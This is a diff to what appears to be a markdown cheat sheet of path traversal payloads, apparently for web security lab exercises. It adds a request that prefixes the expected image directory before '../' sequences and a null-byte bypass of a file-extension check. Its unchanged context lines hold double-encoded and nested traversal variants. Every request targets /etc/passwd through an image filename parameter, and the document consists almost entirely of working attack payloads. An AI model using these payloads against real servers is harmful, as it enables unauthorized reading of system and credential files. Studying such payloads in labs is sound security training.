@@ -39,6 +39,17 @@ GET /image?filename=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f
 GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```
 
+# File path traversal, validation of start of path
+
+```bash
+GET /image?filename=/var/www/images/../../../etc/passwd
+```
+
+# File path traversal, validation of file extension with null byte bypass
+
+```bash
+GET /image?filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%0056.jpg
+```
 
 
 
